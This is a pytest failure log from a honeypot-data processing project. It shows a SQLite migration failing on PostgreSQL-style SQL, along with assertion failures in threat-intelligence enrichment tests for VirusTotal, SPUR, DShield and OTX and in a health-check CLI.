_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566f45be70>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:26,927:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:26,927:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:26,928:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:26,928:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:26,935:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:26,935:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:26,937:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:26,937:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:26,938:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:26,938:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:26,940:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:26,940:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:26,941:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:26,941:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:26,944:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:26,944:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:26,945:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:26,945:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:26,946:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:26,946:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:26,948:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:26,948:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:26,950:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:26,950:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:26,951:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:26,951:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:26,952:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:26,952:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:26,953:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,953:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,956:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,956:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,956:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,956:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,957:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,957:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,958:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,958:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:26,958:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:26,958:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______________________ test_vt_query_handles_404_response ______________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_vt_query_handles_404_resp0')

    def test_vt_query_handles_404_response(tmp_path: Path) -> None:
        """VirusTotal 404 responses should be handled gracefully."""
        mock_response = SimpleNamespace(
            status_code=404,
            text='{"error": {"code": "NotFoundError", "message": "File not found"}}',
            raise_for_status=lambda: None,
        )
    
        session = DummySession(mock_response)
    
        enrichment_handlers.vt_query(
            "nonexistent_hash",
            tmp_path,
            "api-key",
            session_factory=lambda: cast(requests.Session, session),
        )
    
        # Should cache the 404 response
        vt_file = tmp_path / "nonexistent_hash"
>       assert vt_file.exists()
E       AssertionError: assert False
E        +  where False = exists()
E        +    where exists = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_vt_query_handles_404_resp0/nonexistent_hash').exists

/home/speterson/cowrieprocessor/tests/unit/test_enrichment_handlers.py:245: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:35,354:DEBUG:enrichment_handlers:enrichment_handlers.py:_vt_query_single_attempt:VT query file not found for nonexistent_hash
2025-10-18 18:32:35,354:DEBUG:enrichment_handlers:enrichment_handlers.py:_vt_query_single_attempt:VT query file not found for nonexistent_hash
VT query file not found for nonexistent_hash
VT query file not found for nonexistent_hash
------------------------------ Captured log call -------------------------------
DEBUG    enrichment_handlers:enrichment_handlers.py:196 VT query file not found for nonexistent_hash
_______________ test_read_spur_data_handles_nested_client_schema _______________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_read_spur_data_handles_ne0')

    def test_read_spur_data_handles_nested_client_schema(tmp_path: Path) -> None:
        """SPUR responses with nested client schema should be parsed correctly."""
        nested_payload = {
            "asn": {"number": 67890, "organization": "Nested AS"},
            "client_behaviors": ["SCANNER"],
            "client_proxies": "VPN",
            "client_types": ["MOBILE"],
            "client_count": 5,
        }
    
        spur_path = tmp_path / "spur_203.0.113.10.json"
        spur_path.write_text(json.dumps(nested_payload), encoding="utf-8")
    
        values = enrichment_handlers.read_spur_data(
            "203.0.113.113",
            "spur-token",
            cache_base=tmp_path,
        )
    
>       assert values[0] == "67890"
E       AssertionError: assert '' == '67890'
E         
E         - 67890

/home/speterson/cowrieprocessor/tests/unit/test_enrichment_handlers.py:510: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:35,475:DEBUG:urllib3.connectionpool:connectionpool.py:_new_conn:Starting new HTTPS connection (1): spur.us:443
2025-10-18 18:32:35,475:DEBUG:urllib3.connectionpool:connectionpool.py:_new_conn:Starting new HTTPS connection (1): spur.us:443
Starting new HTTPS connection (1): spur.us:443
Starting new HTTPS connection (1): spur.us:443
2025-10-18 18:32:35,726:DEBUG:urllib3.connectionpool:connectionpool.py:_make_request:https://spur.us:443 "GET /api/v1/context/203.0.113.113 HTTP/1.1" 200 10843
2025-10-18 18:32:35,726:DEBUG:urllib3.connectionpool:connectionpool.py:_make_request:https://spur.us:443 "GET /api/v1/context/203.0.113.113 HTTP/1.1" 200 10843
https://spur.us:443 "GET /api/v1/context/203.0.113.113 HTTP/1.1" 200 10843
https://spur.us:443 "GET /api/v1/context/203.0.113.113 HTTP/1.1" 200 10843
2025-10-18 18:32:35,739:DEBUG:enrichment_handlers:enrichment_handlers.py:_parse_spur_payload:Malformed SPUR payload: <!DOCTYPE html>
<html lang="en-US" prefix="og: https://ogp.me/ns#">
  <head>
    <meta charset="UTF-8" />
    <script>
      var
2025-10-18 18:32:35,739:DEBUG:enrichment_handlers:enrichment_handlers.py:_parse_spur_payload:Malformed SPUR payload: <!DOCTYPE html>
<html lang="en-US" prefix="og: https://ogp.me/ns#">
  <head>
    <meta charset="UTF-8" />
    <script>
      var
Malformed SPUR payload: <!DOCTYPE html>
<html lang="en-US" prefix="og: https://ogp.me/ns#">
  <head>
    <meta charset="UTF-8" />
    <script>
      var
Malformed SPUR payload: <!DOCTYPE html>
<html lang="en-US" prefix="og: https://ogp.me/ns#">
  <head>
    <meta charset="UTF-8" />
    <script>
      var
------------------------------ Captured log call -------------------------------
DEBUG    urllib3.connectionpool:connectionpool.py:1049 Starting new HTTPS connection (1): spur.us:443
DEBUG    urllib3.connectionpool:connectionpool.py:544 https://spur.us:443 "GET /api/v1/context/203.0.113.113 HTTP/1.1" 200 10843
DEBUG    enrichment_handlers:enrichment_handlers.py:477 Malformed SPUR payload: <!DOCTYPE html>
<html lang="en-US" prefix="og: https://ogp.me/ns#">
  <head>
    <meta charset="UTF-8" />
    <script>
      var
___________________ test_all_services_handle_empty_api_keys ____________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_all_services_handle_empty0')

    def test_all_services_handle_empty_api_keys(tmp_path: Path) -> None:
        """All services should handle empty/missing API keys gracefully."""
        services = [
            ("vt", lambda: enrichment_handlers.vt_query("test", tmp_path, "")),
            ("dshield", lambda: enrichment_handlers.dshield_query("1.2.3.4", "")),
            ("urlhaus", lambda: enrichment_handlers.safe_read_uh_data("1.2.3.4", "")),
            ("spur", lambda: enrichment_handlers.read_spur_data("1.2.3.4", "")),
        ]
    
        for service_name, service_func in services:
            result = service_func()
    
            if service_name == "vt":
                # VT query should return None (no exception)
                assert result is None
            elif service_name == "dshield":
                # DShield should return safe defaults
>               assert result == {"ip": {"asname": "", "ascountry": ""}}
E               AssertionError: assert {'ip': {'as':...routed', ...}} == {'ip': {'asco...'asname': ''}}
E                 
E                 Differing items:
E                 {'ip': {'as': 0, 'asabusecontact': None, 'ascountry': 'XX', 'asname': 'not routed', ...}} != {'ip': {'ascountry': '', 'asname': ''}}
E                 Use -v to get more diff

/home/speterson/cowrieprocessor/tests/unit/test_enrichment_handlers.py:620: AssertionError
_________________ test_malformed_responses_handled_gracefully __________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_malformed_responses_handl0')

    def test_malformed_responses_handled_gracefully(tmp_path: Path) -> None:
        """All services should handle malformed API responses gracefully."""
        malformed_responses = {
            "vt": "{invalid json",
            "dshield": "{invalid json",
            "urlhaus": "{invalid json",
            "spur": "{invalid json",
        }
    
        # Create mock sessions that return malformed JSON
        class MalformedSession:
            def __init__(self, response_text):
                self.response_text = response_text
                self.calls = []
                self.closed = False
    
            def get(self, url, timeout=30):
                self.calls.append(("GET", url, timeout))
                return SimpleNamespace(
                    text=self.response_text,
                    raise_for_status=lambda: None,
                )
    
            def post(self, url, headers, data, timeout=30):
                self.calls.append(("POST", url, headers, data, timeout))
                return SimpleNamespace(
                    text=self.response_text,
                    raise_for_status=lambda: None,
                )
    
            def close(self):
                self.closed = True
    
        # Test each service
        services = [
            ("dshield", enrichment_handlers.dshield_query, "1.2.3.4", "email"),
            ("urlhaus", enrichment_handlers.read_uh_data, "1.2.3.4", "key"),
            ("spur", enrichment_handlers.read_spur_data, "1.2.3.4", "key"),
        ]
    
        for service_name, service_func, *args in services:
            session = MalformedSession(malformed_responses[service_name])
    
            if service_name == "dshield":
                result = service_func(*args, session_factory=lambda: cast(requests.Session, session))  # type: ignore
>               assert result == {"ip": {"asname": "", "ascountry": ""}}
E               AssertionError: assert {'ip': {'as':...routed', ...}} == {'ip': {'asco...'asname': ''}}
E                 
E                 Differing items:
E                 {'ip': {'as': 0, 'asabusecontact': None, 'ascountry': 'XX', 'asname': 'not routed', ...}} != {'ip': {'ascountry': '', 'asname': ''}}
E                 Use -v to get more diff

/home/speterson/cowrieprocessor/tests/unit/test_enrichment_handlers.py:696: AssertionError
_____________________________ test_health_cli_json _____________________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_health_cli_json0')
capsys = <_pytest.capture.CaptureFixture object at 0x7756b3c80d60>

    def test_health_cli_json(tmp_path, capsys) -> None:
        """Health CLI should report OK for valid db and status files."""
        db_path = tmp_path / "db.sqlite"
        db_path.write_text("", encoding="utf-8")
        status_dir = tmp_path / "status"
        status_dir.mkdir()
        _write_status(status_dir, "status", {"last_updated": "2025-01-01T00:00:00Z"})
    
        exit_code = health_cli.main(
            [
                "--db",
                str(db_path),
                "--status-dir",
                str(status_dir),
                "--output",
                "json",
            ]
        )
    
>       assert exit_code == 0
E       assert 1 == 0

/home/speterson/cowrieprocessor/tests/unit/test_health_cli.py:35: AssertionError
----------------------------- Captured stdout call -----------------------------
{
  "status": "warning",
  "summary": "Database check failed (unsupported database type: /tmp/pytest-of-speterson/pytest-33/test_health_cli_json0/db.sqlite)",
  "database_ok": false,
  "status_files_ok": true,
  "latest_status": {
    "last_updated": "2025-01-01T00:00:00Z"
  }
}
________________________ test_health_cli_missing_status ________________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_health_cli_missing_status0')
capsys = <_pytest.capture.CaptureFixture object at 0x7756b309f530>

    def test_health_cli_missing_status(tmp_path, capsys) -> None:
        """Health CLI should warn when status files are missing."""
        db_path = tmp_path / "db.sqlite"
        db_path.write_text("", encoding="utf-8")
        exit_code = health_cli.main(
            [
                "--db",
                str(db_path),
                "--status-dir",
                str(tmp_path / "missing"),
            ]
        )
    
        assert exit_code == 1
        text_out = capsys.readouterr().out
>       assert "warning" in text_out.lower()
E       AssertionError: assert 'warning' in 'status: critical\nsummary: database check failed (unsupported database type: /tmp/pytest-of-speterson/pytest-33/test_...database type: /tmp/pytest-of-speterson/pytest-33/test_health_cli_missing_status0/db.sqlite)\nstatus files ok: false\n'
E        +  where 'status: critical\nsummary: database check failed (unsupported database type: /tmp/pytest-of-speterson/pytest-33/test_...database type: /tmp/pytest-of-speterson/pytest-33/test_health_cli_missing_status0/db.sqlite)\nstatus files ok: false\n' = <built-in method lower of str object at 0x7756b246e730>()
E        +    where <built-in method lower of str object at 0x7756b246e730> = 'Status: critical\nSummary: Database check failed (unsupported database type: /tmp/pytest-of-speterson/pytest-33/test_...database type: /tmp/pytest-of-speterson/pytest-33/test_health_cli_missing_status0/db.sqlite)\nStatus files OK: False\n'.lower

/home/speterson/cowrieprocessor/tests/unit/test_health_cli.py:57: AssertionError
___________ TestMockOTXHandler.test_otx_check_ip_handles_private_ips ___________

self = <test_mock_enrichment_handlers.TestMockOTXHandler object at 0x7756b4311950>
mock_otx = <tests.fixtures.mock_enrichment_handlers.MockOTXHandler object at 0x7756b2b179d0>

    def test_otx_check_ip_handles_private_ips(self, mock_otx) -> None:
        """Mock OTX should return clean results for private IPs."""
        private_ips = ["192.168.1.1", "10.0.0.1", "127.0.0.1"]
    
        for ip in private_ips:
            result = mock_otx.check_ip(ip)
>           assert result["reputation"] == 0
E           assert 6 == 0

/home/speterson/cowrieprocessor/tests/unit/test_mock_enrichment_handlers.py:51: AssertionError
_________ TestMockOTXHandler.test_otx_check_ip_handles_suspicious_ips __________

self = <test_mock_enrichment_handlers.TestMockOTXHandler object at 0x7756b40a2b10>
mock_otx = <tests.fixtures.mock_enrichment_handlers.MockOTXHandler object at 0x7756b35ead70>

    def test_otx_check_ip_handles_suspicious_ips(self, mock_otx) -> None:
        """Mock OTX should return malicious results for suspicious IPs."""
        # Set seed for deterministic results
        import random
    
        random.seed(42)
    
        suspicious_ips = ["203.0.113.1", "198.51.100.1", "malicious.example.com"]
    
        for ip in suspicious_ips:
            result = mock_otx.check_ip(ip)
    
            # Most IPs should be flagged as suspicious (70% chance)
            # With seed 42, these should be flagged
>           assert result["reputation"] > 0 or len(result["pulse_info"]["pulses"]) > 0
E           assert (0 > 0 or 0 > 0)
E            +  where 0 = len([])

/home/speterson/cowrieprocessor/tests/unit/test_mock_enrichment_handlers.py:78: AssertionError
_____ TestMockOTXHandler.test_otx_check_file_hash_handles_known_bad_hashes _____

self = <test_mock_enrichment_handlers.TestMockOTXHandler object at 0x7756b40457b0>
mock_otx = <tests.fixtures.mock_enrichment_handlers.MockOTXHandler object at 0x7756b3138af0>

    def test_otx_check_file_hash_handles_known_bad_hashes(self, mock_otx) -> None:
        """Mock OTX should flag known bad hashes."""
        bad_hashes = ["0000deadbeef", "deadbeef0000", "badhash123456"]
    
        for hash_value in bad_hashes:
            result = mock_otx.check_file_hash(hash_value)
>           assert result["malware"] is True
E           assert False is True

/home/speterson/cowrieprocessor/tests/unit/test_mock_enrichment_handlers.py:100: AssertionError
____ TestMockOTXHandler.test_otx_check_file_hash_handles_known_good_hashes _____

